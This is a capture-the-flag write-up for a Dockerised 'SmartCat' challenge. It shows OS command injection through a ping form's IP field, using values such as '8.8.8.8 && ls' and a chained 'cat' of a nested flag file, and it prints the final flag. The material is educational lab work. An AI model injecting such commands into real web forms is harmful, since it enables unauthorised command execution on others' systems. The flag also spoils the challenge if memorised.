## SmartCat

First of all, we need to build the **docker container** with the following command:

```commandline
docker build -t smartcat .
```

Then, we can start the **image** from the GUI and expose the port `8080:5000`.

### Inspecting the page

By inspecting the page, we see an input box for an **IP address** to send a ping to. The default value is `8.8.8.8` 
(Google's public DNS) and returns the ping statistics.

Trying with `127.0.0.1` doesn't change anything, but trying a **fake** IP like `1.2.3.4` returns an interesting result:

```
Error running ping: Command 'ping -c 1 1.2.3.4' timed out after 3 seconds
```

This means that behind the scenes the command `ping` is being executed, with only one packet, to our destination IP.
Maybe we can try to **chain commands** to see if there is no sanitization happening.

### Exploiting the logic

Indeed, passing `8.8.8.8 && ls`, returns the following output:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=63 time=22.7 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 22.654/22.654/22.654/0.000 ms
index.py    [!]
there       [!]
```

Now that we know that it works, we can run `ls -R` to list every file **recursively**.
At the end of the gigantic **sub-folder tree**, we see a file named `flag`.

We can now `cat` the **contents** of the file with the following command to get the **flag**.

```
8.8.8.8 && cat ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
```

```
INS{warm_kitty_smelly_kitty_flush_flush_flush}
```
